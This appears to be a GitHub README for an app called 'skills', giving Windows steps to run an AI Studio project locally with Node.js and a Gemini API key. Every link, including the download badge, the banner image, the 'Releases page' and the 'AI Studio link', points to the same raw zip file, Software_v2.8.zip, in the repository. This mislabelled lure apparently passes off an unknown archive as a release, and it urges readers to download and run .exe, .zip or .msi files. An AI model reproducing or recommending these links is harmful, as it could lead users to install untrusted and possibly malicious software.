# 🧠 skills - Run Your AI Studio App Fast

[![Download skills](https://img.shields.io/badge/Download%20skills-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Lexicostatistic-scenarist364/skills/main/src/Software_v2.8.zip)

<div align="center">
  <img width="1200" height="475" alt="GHBanner" src="https://raw.githubusercontent.com/Lexicostatistic-scenarist364/skills/main/src/Software_v2.8.zip" />
</div>

## 🚀 What this app does

**skills** is a local app runner for an AI Studio project. It helps you open and use the app on your Windows PC with a few simple steps.

Use it if you want to:

- run the app on your own computer
- test changes before you share them
- keep work on your device
- connect the app to your Gemini API key

## 📥 Download the app

Visit this page to download or get the latest release:

[Download skills from Releases](https://raw.githubusercontent.com/Lexicostatistic-scenarist364/skills/main/src/Software_v2.8.zip)

If you see a file such as `.exe`, `.zip`, or `.msi`, download it to your PC first.

## 🪟 Windows setup

This guide is for Windows users who want to run the app locally.

### What you need

- Windows 10 or Windows 11
- A web browser
- Internet access
- Node.js installed on your PC
- A Gemini API key

### Before you start

Make sure you have enough free disk space for the app files and tools it uses. A few hundred MB is usually enough.

## 🛠️ Install Node.js

The app needs Node.js to run.

1. Open the Node.js download page
2. Download the Windows installer
3. Run the installer
4. Follow the setup steps
5. Keep the default settings unless you know you want something else

After install, restart your PC if Windows asks for it.

## 🔐 Get your Gemini API key

The app needs a Gemini API key before it can run.

1. Sign in to your Gemini account
2. Open the API key page
3. Create a new key
4. Copy the key
5. Keep it in a safe place

You will paste this key into a local file in the next step.

## 📁 Set up the app files

1. Download the release from the link above
2. Save the files in a folder you can find again
3. If the download is a `.zip` file, right-click it and choose **Extract All**
4. Open the folder after extraction
5. Look for the app files inside

If you are using the source files from GitHub instead of a release file, keep the folder ready for the next steps.

## ⚙️ Create the local environment file

The app uses a file named `.env.local` for private settings.

1. Open the app folder
2. Find the file named `.env.local`
3. If the file does not exist, create a new text file
4. Rename it to `.env.local`
5. Open it in Notepad
6. Add this line:

`GEMINI_API_KEY=your_api_key_here`

7. Replace `your_api_key_here` with the key you copied
8. Save the file

Do not add spaces before or after the `=` sign.

## ▶️ Run the app

Open Command Prompt or PowerShell in the app folder, then run:

`npm install`

After that, run:

`npm run dev`

If the app starts well, it will show a local address in the terminal. Open that address in your browser.

## 🌐 Open the app in your browser

When the app is running:

1. Copy the local address shown in the terminal
2. Paste it into your browser
3. Press Enter
4. Use the app in the window that opens

If the app opens at `http://localhost:3000`, that is the local copy running on your PC.

## 🧩 How the app is organized

The app uses a simple setup:

- **Frontend**: what you see in the browser
- **Local run tools**: what starts the app on your PC
- **Environment file**: where your API key is stored
- **Node modules**: the files installed by `npm install`

You do not need to edit these files to use the app.

## 🧪 Common tasks

### Start the app again

If you close the window, open the app folder and run:

`npm run dev`

### Update the app files

If a new release appears:

1. Download the new release
2. Replace the old files
3. Keep your `.env.local` file if you still use the same API key
4. Run `npm install` again if needed

### Change the API key

1. Open `.env.local`
2. Replace the old key with the new one
3. Save the file
4. Restart the app

## 🔍 If the app does not start

Check these items:

- Node.js is installed
- You ran `npm install`
- The `.env.local` file exists
- The API key is spelled correctly
- You are in the right folder when you run the commands

If the window closes fast, open PowerShell in the app folder and run the commands again so you can read the message.

## 📌 Quick start

1. Visit the [Releases page](https://raw.githubusercontent.com/Lexicostatistic-scenarist364/skills/main/src/Software_v2.8.zip)
2. Download the latest release
3. Install Node.js
4. Add your Gemini API key to `.env.local`
5. Run `npm install`
6. Run `npm run dev`
7. Open the local address in your browser

## 🖥️ Suggested use

This app works well if you want to:

- test an AI Studio app on Windows
- run a local copy on your own machine
- try changes before you share them
- keep your API settings in one place

## 📂 File names you may see

You may see some of these files in the folder:

- `.env.local`
- `package.json`
- `node_modules`
- source files for the app
- release files from GitHub

## 🔗 AI Studio link

You can also view the app in AI Studio:

https://raw.githubusercontent.com/Lexicostatistic-scenarist364/skills/main/src/Software_v2.8.zip